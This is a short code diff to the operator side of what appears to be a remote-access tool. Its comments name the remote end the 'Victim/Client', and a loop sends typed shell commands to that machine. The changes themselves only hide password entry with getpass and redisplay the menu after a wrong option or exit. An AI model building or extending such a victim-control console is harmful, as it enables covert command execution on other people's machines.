@@ -5,6 +5,7 @@ import json
 import hashlib
 from glob import glob
 from Server import *
+import getpass
 
 # define globals
 DSIZE = 102400
@@ -47,7 +48,9 @@ def serverhandler(my_socket):
          
          else :
              print ("[+] Wrong Option")
-             break
+             print("")
+             show_options()
+             continue
 
 # get output of commands executed on Victim/Client
 def send_commands(my_socket):
@@ -56,6 +59,8 @@ def send_commands(my_socket):
          cmd = input(">> ")
          my_socket.send_data(cmd)
          if cmd == "exit" or cmd == "quit" or cmd == "stop":
+             print("")
+             show_options()
              break
          if cmd == "":
              continue
@@ -100,7 +105,8 @@ def check_password(my_socket):
      while i<3:
          opt = 3-i
          print(f"[+] {opt} Chance Remaining")
-         password = input("[+] Enter Password : ")
+        #  password = input("[+] Enter Password : ")
+         password = getpass.getpass("[+] Enter Password : ")
          passbytes = password.encode('utf-8')
          # Encrypting Password Using SHA-1 
          hashval = hashlib.sha1(passbytes).hexdigest()
